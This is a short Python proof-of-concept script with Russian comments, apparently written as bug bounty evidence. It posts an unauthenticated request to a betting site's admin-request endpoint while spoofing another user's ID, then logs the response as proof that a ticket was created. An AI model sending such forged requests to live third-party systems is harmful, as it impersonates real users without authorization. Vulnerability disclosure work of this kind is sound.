# bug4_poc.py
import requests
import json
import time

BASE = "https://1xlite-03801.world"

# уникальный маркер чтобы потом найти в саппорте
MARKER = f"BUGBOUNTY-TEST-{int(time.time())}"

print(f"маркер запроса: {MARKER}")
print("после теста проверь в саппорте наличие этого маркера\n")

body = {
    "username": "bugbounty_test",
    "email": "bugbounty@test.com",
    "userId": 67,
    "message": f"это тестовое сообщение для проверки уязвимости. маркер: {MARKER}"
}

r = requests.post(
    BASE + "/web-api/officeapi/sendadminrequest",
    json=body,
    headers={
        "Content-Type": "application/json",
        "Origin": BASE,
        "User-Agent": "Mozilla/5.0"
    }
)

print(f"статус: {r.status_code}")
print(f"server-timing: {r.headers.get('Server-Timing', '')}")
print(f"все заголовки ответа:")
for k, v in r.headers.items():
    print(f"  {k}: {v}")
print(f"тело: {r.text or '(пустое - 204 No Content)'}")

print(f"""
=== инструкция для доказательства ===
1 войди в саппорт 1xlite под аккаунтом userId=67 или как администратор
2 найди тикет с маркером: {MARKER}
3 если тикет существует - сделай скриншот
4 это докажет что 204 означает реальное создание записи в системе
""")

with open("bug4_evidence.txt", "w") as f:
    f.write(f"marker: {MARKER}\n")
    f.write(f"status: {r.status_code}\n")
    f.write(f"server-timing: {r.headers.get('Server-Timing', '')}\n")
    f.write(f"request body: {json.dumps(body)}\n")
print("сохранено в bug4_evidence.txt")
